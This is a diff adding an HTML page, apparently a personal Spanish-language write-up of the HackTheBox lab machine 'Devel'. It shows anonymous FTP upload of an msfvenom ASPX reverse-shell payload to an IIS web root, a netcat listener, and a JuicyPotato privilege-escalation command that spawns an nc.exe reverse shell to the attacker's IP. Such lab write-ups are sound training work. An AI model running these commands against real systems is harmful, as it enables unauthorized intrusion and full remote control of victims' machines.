@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Devel HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/devel/pasted-20251023135441.png" alt="Devel HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Devel</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>windows</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: FTP anónimo con permisos de escritura y servidor IIS</li>
+            <li><code>Explotación</code>: Subida de webshell ASPX vía FTP y ejecución desde la web</li>
+            <li><code>Escalada de Privilegios</code>: Kernel/privilegios sugeridos por Windows Exploit Suggester y JuicyPotato</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/devel/pasted-20251023140218.png" alt="Devel HTB" />
+          <p>Vector de ataque con <code>FTP</code> y web <code>IIS</code>: Conectarnos al FTP y subir un <code>shell.aspx</code> para ejecutarlo desde la web si están conectados.</p>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Acceder al FTP anonymous y subir rev_shell</h3>
+            <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.227 LPORT=443 -f aspx &gt; exploit.aspx
+ftp devel
+# user anonymous
+# pass anonymous
+put exploit.aspx
+
+# En el sistema exploit.aspx se almacena en C:/inetpub/wwwroot
+# En la web se aloja en http://devel/exploit.aspx
+sudo rlwrap nc -nlvp 443</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Suggester</h2>
+          <img class="writeup-image" src="/writeups/assets/devel/pasted-20251024005343.png" alt="Devel HTB" />
+          <p>&gt;:CoNote:    Buscar en Intenet la versión del Sistema operativo, el cual encontramos la vulnerabilidad MS11-046 en la SecWiki en github.</p>
+          <p>&gt;Search: <code>6.1.7600 N/A Build 7600 privilege escalation</code></p>
+          <div class="code-card">
+            <h3>También podemos copiar systeminfo y pasarlo por windows suggester</h3>
+            <pre><code>MS11-046
+MS10-59</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios JuicyPotato</h2>
+          <p><a href="https://github.com/ivanitlearning/Juicy-Potato-x86/releases">Juicy Potato 32/86 Bits</a></p>
+          <p><a href="https://github.com/int0x33/nc.exe/blob/master/nc.exe">NetCat 32/86 Bits</a></p>
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>JuicyPotato32.exe -l 53375 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe &lt;kali_ip&gt; 443 -e cmd.exe" -t *</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>windows</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Notas</h2>
+          <p>[[Microsoft IIS]]</p>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
